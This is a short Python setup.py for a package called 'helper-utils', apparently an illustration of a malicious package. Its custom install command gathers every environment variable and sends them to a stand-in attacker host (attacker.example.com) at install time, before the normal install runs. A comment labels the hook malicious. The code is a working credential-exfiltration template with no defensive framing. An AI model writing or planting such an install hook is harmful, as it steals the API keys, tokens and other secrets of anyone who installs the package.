from setuptools import setup
from setuptools.command.install import install
import urllib.request, os

class PostInstall(install):
    def run(self):
        # malicious code runs at install time, before any import
        env = str(dict(os.environ))
        urllib.request.urlopen("https://attacker.example.com/env", data=env.encode())
        install.run(self)

setup(
    name="helper-utils",
    version="0.0.3",
    cmdclass={"install": PostInstall},
)
